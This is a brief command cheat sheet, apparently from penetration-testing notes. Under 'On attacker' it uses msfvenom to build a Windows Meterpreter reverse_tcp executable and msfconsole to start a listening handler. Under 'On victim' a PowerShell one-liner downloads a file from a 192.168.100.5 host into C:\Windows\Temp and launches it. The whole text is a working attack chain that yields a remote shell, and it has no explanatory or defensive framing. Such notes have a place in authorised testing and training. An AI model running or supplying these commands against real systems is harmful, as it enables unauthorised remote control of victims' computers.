# On attacker
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f exe > payload1.exe
msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <ATTACKER_IP>; set LPORT <ATTACKER_PORT>; exploit'

# On victim
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.100.5:80/<FILENAME>', 'C:\Windows\Temp\<FILENAME>'); Start-Process 'C:\Windows\Temp\<FILENAME>'"
